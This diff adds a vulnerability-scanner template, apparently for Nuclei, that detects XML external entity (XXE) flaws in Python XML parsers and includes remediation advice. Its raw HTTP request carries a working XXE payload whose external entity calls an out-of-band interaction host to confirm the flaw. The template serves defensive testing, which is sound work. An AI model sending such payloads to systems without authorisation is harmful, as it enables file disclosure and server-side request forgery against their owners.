@@ -1,0 +1,50 @@
+id: xxe-python-oob
+
+info:
+  name: Python XML Parser - XXE Out-of-Band
+  author: n0x
+  severity: high
+  description: |
+    Targets Python XML parsers that resolve external general entities (for
+    example lxml with resolve_entities=True, or xml.dom.minidom in older
+    configurations). A DNS/HTTP interaction to Interactsh confirms entity
+    expansion.
+
+    Python's standard ElementTree and defusedxml configurations are generally
+    not vulnerable; a non-match does not prove the parser is safe.
+  impact: |
+    XXE can lead to local file disclosure, SSRF, internal service access, and
+    in some stacks remote code execution.
+  remediation: |
+    Use defusedxml, disable entity resolution and DTD processing, and restrict
+    outbound network access from application servers.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  classification:
+    cwe-id: CWE-611
+  metadata:
+    max-request: 1
+  tags: xxe,python,oob,web
+
+variables:
+  xxe_url: "{{BaseURL}}"
+
+http:
+  - raw:
+      - |
+        POST {{xxe_url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe-python">]>
+        <foo>&xxe;</foo>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
